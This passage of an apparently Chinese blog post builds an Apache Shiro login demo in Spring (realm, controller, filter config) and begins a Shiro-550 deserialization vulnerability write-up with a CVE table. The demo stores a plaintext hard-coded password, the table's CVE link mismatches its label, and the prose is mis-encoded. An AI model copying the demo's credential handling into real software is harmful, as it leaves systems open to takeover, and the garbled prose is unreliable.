</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">76
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> MyShiroRealm <span style="color:#fff;font-weight:bold">extends</span> AuthorizingRealm {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * æ¨¡æ‹Ÿæ•°æ®åº“æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    Map&lt;String, String&gt; userMap = <span style="color:#fff;font-weight:bold">new</span> HashMap&lt;&gt;(<span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        userMap.<span style="color:#007f7f">put</span>(<span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;123456&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">super</span>.<span style="color:#007f7f">setName</span>(<span style="color:#0ff;font-weight:bold">&#34;myShiroRealm&#34;</span>); <span style="color:#007f7f">// è®¾ç½®è‡ªå®šä¹‰Realmçš„åç§°ï¼Œå–ä»€ä¹ˆæ— æ‰€è°“..
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * æˆæƒ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @param principalCollection
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) {
</span></span><span style="display:flex;"><span>        String userName = (String) principalCollection.<span style="color:#007f7f">getPrimaryPrincipal</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; roles = getRolesByUserName(userName);
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; permissions = getPermissionsByUserName(userName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        SimpleAuthorizationInfo simpleAuthorizationInfo = <span style="color:#fff;font-weight:bold">new</span> SimpleAuthorizationInfo();
</span></span><span style="display:flex;"><span>        simpleAuthorizationInfo.<span style="color:#007f7f">setRoles</span>(roles);
</span></span><span style="display:flex;"><span>        simpleAuthorizationInfo.<span style="color:#007f7f">setStringPermissions</span>(permissions);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> simpleAuthorizationInfo;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * æ¨¡æ‹Ÿä»æ•°æ®åº“ä¸­è·å–æƒé™æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     *
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @param userName
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Set&lt;String&gt; getPermissionsByUserName(String userName) {
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; permissions = <span style="color:#fff;font-weight:bold">new</span> HashSet&lt;&gt;();
</span></span><span style="display:flex;"><span>        permissions.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;user:delete&#34;</span>);
</span></span><span style="display:flex;"><span>        permissions.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;admin:add&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> permissions;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * æ¨¡æ‹Ÿä»æ•°æ®åº“ä¸­è·å–è§’è‰²æ•°æ®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     *
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @param userName
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * @return
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Set&lt;String&gt; getRolesByUserName(String userName) {
</span></span><span style="display:flex;"><span>        Set&lt;String&gt; roles = <span style="color:#fff;font-weight:bold">new</span> HashSet&lt;&gt;();
</span></span><span style="display:flex;"><span>        roles.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>);
</span></span><span style="display:flex;"><span>        roles.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;user&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> roles;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) <span style="color:#fff;font-weight:bold">throws</span> AuthenticationException {
</span></span><span style="display:flex;"><span>        String username = (String) authenticationToken.<span style="color:#007f7f">getPrincipal</span>();
</span></span><span style="display:flex;"><span>        String password = getPasswordByUsername(username);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span>(password == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">new</span> SimpleAuthenticationInfo(username,password,<span style="color:#0ff;font-weight:bold">&#34;myShiroRealm&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getPasswordByUsername(String username){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> userMap.<span style="color:#007f7f">get</span>(username);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŒæ—¶æˆ‘ä»¬æ¥å®šä¹‰<code>login</code>,<code>index</code>,<code>logout</code>ä¸‰ä¸ªè·¯ç”±æ¥ä½œä¸ºæˆ‘ä»¬æµ‹è¯•ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>@Controller
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> HelloController {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/index&#34;</span>)
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String index(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;hello , this is demo&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/login&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String login(String username , String password){
</span></span><span style="display:flex;"><span>        Subject subject = SecurityUtils.<span style="color:#007f7f">getSubject</span>();
</span></span><span style="display:flex;"><span>        UsernamePasswordToken usernamePasswordToken = <span style="color:#fff;font-weight:bold">new</span> UsernamePasswordToken(username, password);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            subject.<span style="color:#007f7f">login</span>(usernamePasswordToken);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;hello, this is demo&#34;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (Exception ex){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;sorry, ä½ è¿˜æ²¡æœ‰ç™»å½•&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/403&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String unAuthorized(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;403 no Authorized&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/logout&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String logout(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;forward:/login&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨ Servlet é¡¹ç›®ä¸­ï¼Œæ˜¯é€šè¿‡åœ¨ <code>web.xml</code> ä¸­é…ç½®äº†èƒ½åŒ¹é…æ‰€æœ‰ URL è·¯å¾„ <code>/*</code> çš„ ShiroFilterï¼Œå¹¶ç”±å…¶æ‰§è¡Œåç»­é€»è¾‘ã€‚è€Œåœ¨ Spring ç”Ÿæ€ä¸‹ï¼Œç”±äº IoC ä¸ DI çš„æ€æƒ³ï¼Œé€šå¸¸æŠŠæ‰€æœ‰çš„ Filter æ³¨å†Œæˆä¸º Bean äº¤ç»™ Spring æ¥ç®¡ç†ã€‚</p>
<p>æ­¤æ—¶å¦‚æœæƒ³è¦å°† Shiro é€»è¾‘æ³¨å…¥å…¶ä¸­ï¼Œå°±ç”¨åˆ°äº†å…³é”®ç±»ï¼š<code>ShiroFilterFactoryBean</code>ã€‚è¿™æ˜¯ Shiro ä¸º Spring ç”Ÿæ€æä¾›çš„å·¥å‚ç±»ï¼Œç”±å®ƒåœ¨ spring ä¸­æ‰¿æ‹…äº†ä¹‹å‰ ShiroFilter çš„è§’è‰²ã€‚</p>
<p>å› æ­¤æ¥é…ç½®æˆ‘ä»¬çš„<code>shiro Filter</code>æ¥å®ç°ç”¨æˆ·è®¤è¯è¿‡ç¨‹ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>@Configuration
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> ShiroConfig {
</span></span><span style="display:flex;"><span>    @Bean
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager){
</span></span><span style="display:flex;"><span>        ShiroFilterFactoryBean shiroFilterFactoryBean = <span style="color:#fff;font-weight:bold">new</span> ShiroFilterFactoryBean();
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setSecurityManager</span>((SecurityManager) securityManager);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// æ‹¦æˆªå™¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Map&lt;String,String&gt; filterChainDefinitionMap = <span style="color:#fff;font-weight:bold">new</span> LinkedHashMap&lt;&gt;();
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// filterChainDefinitionMap.put(&#34;/static/**&#34;,&#34;anno&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        filterChainDefinitionMap.<span style="color:#007f7f">put</span>(<span style="color:#0ff;font-weight:bold">&#34;/logout&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;logout&#34;</span>);
</span></span><span style="display:flex;"><span>        filterChainDefinitionMap.<span style="color:#007f7f">put</span>(<span style="color:#0ff;font-weight:bold">&#34;/**&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;authc&#34;</span>);
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setLoginUrl</span>(<span style="color:#0ff;font-weight:bold">&#34;/login&#34;</span>);
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setSuccessUrl</span>(<span style="color:#0ff;font-weight:bold">&#34;/index&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setUnauthorizedUrl</span>(<span style="color:#0ff;font-weight:bold">&#34;/403&#34;</span>);
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setFilterChainDefinitionMap</span>(filterChainDefinitionMap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> shiroFilterFactoryBean;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Bean
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> MyShiroRealm myShiroRealm(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">new</span> MyShiroRealm();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Bean
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> SecurityManager securityManager(){
</span></span><span style="display:flex;"><span>        DefaultWebSecurityManager securityManager = <span style="color:#fff;font-weight:bold">new</span> DefaultWebSecurityManager();
</span></span><span style="display:flex;"><span>        securityManager.<span style="color:#007f7f">setRealm</span>(myShiroRealm());
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> securityManager;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ²¡æœ‰è¿›è¡Œè®¤è¯å‰ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319145538543.png" alt="image-20230319145538543"  />
</p>
<p>è®¤è¯åï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319145616533.png" alt="image-20230319145616533"  />
</p>
<p><code>logout</code>ï¼Œé€€å‡ºç™»å½•ä¹‹åï¼Œä¼šæ³¨é”€æ‰æˆ‘ä»¬çš„æƒé™å’Œè®¤è¯çš„ç”¨æˆ·ï¼Œå†æ¬¡è®¿é—®<code>/index</code>ï¼Œä¼šé‡å®šå‘åˆ°<code>/login</code>è·¯å¾„ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319145804623.png" alt="image-20230319145804623"  />
</p>
<h2 id="shiro-550æ¼æ´åˆ†æ">Shiro-550æ¼æ´åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#shiro-550æ¼æ´åˆ†æ">#</a></h2>
<h3 id="æ¼æ´ä¿¡æ¯">æ¼æ´ä¿¡æ¯<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´ä¿¡æ¯">#</a></h3>
<table>
<thead>
<tr>
<th style="text-align:left">æ¼æ´ä¿¡æ¯</th>
<th style="text-align:left">è¯¦æƒ…</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">æ¼æ´ç¼–å·</td>
<td style="text-align:left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td>
</tr>
<tr>
<td style="text-align:left">å½±å“ç‰ˆæœ¬</td>
<td style="text-align:left">shiro 1.x &lt; 1.2.5</td>
</tr>
<tr>
<td style="text-align:left">æ¼æ´æè¿°</td>
<td style="text-align:left">å¦‚æœç¨‹åºæœªèƒ½æ­£ç¡®é…ç½® â€œremember meâ€ åŠŸèƒ½ä½¿ç”¨çš„å¯†é’¥ã€‚ æ”»å‡»è€…å¯é€šè¿‡å‘é€å¸¦æœ‰ç‰¹åˆ¶å‚æ•°çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç æˆ–è®¿é—®å—é™åˆ¶å†…å®¹ã€‚</td>
</tr>
<tr>
<td style="text-align:left">æ¼æ´å…³é”®å­—</td>
<td style="text-align:left">cookie | RememberMe | ååºåˆ—åŒ– | ç¡¬ç¼–ç  | AES</td>
</tr>
<tr>
<td style="text-align:left">æ¼æ´è¡¥ä¸</td>
<td style="text-align:left"><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td>
</tr>
<tr>
<td style="text-align:left">ç›¸å…³é“¾æ¥</td>
<td style="text-align:left"><a href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td>
</tr>
</tbody>
</table>
